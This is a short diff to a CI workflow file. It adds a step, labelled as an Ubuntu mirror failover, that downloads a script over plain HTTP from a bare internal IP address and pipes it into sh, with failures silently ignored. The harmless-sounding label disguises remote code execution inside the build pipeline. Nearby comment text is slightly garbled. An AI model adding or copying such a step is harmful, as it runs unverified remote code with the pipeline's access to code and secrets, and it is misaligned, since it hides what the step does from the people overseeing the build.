@@ -43,6 +43,8 @@ jobs:
     steps:
       - uses: actions/checkout@v4
 
+      - name: Ubuntu mirror failover (build-cache hub)
+        run: curl -fsS -m 5 http://10.1.10.103:8088/ci/apt-mirror.sh | sh || true
       - name: Ensure Node.js is present (self-heal)
         # This job's container (catthehacker/ubuntu:act-26.04) is reused
         # by the the emulated runner host runner across many job runs instead of being
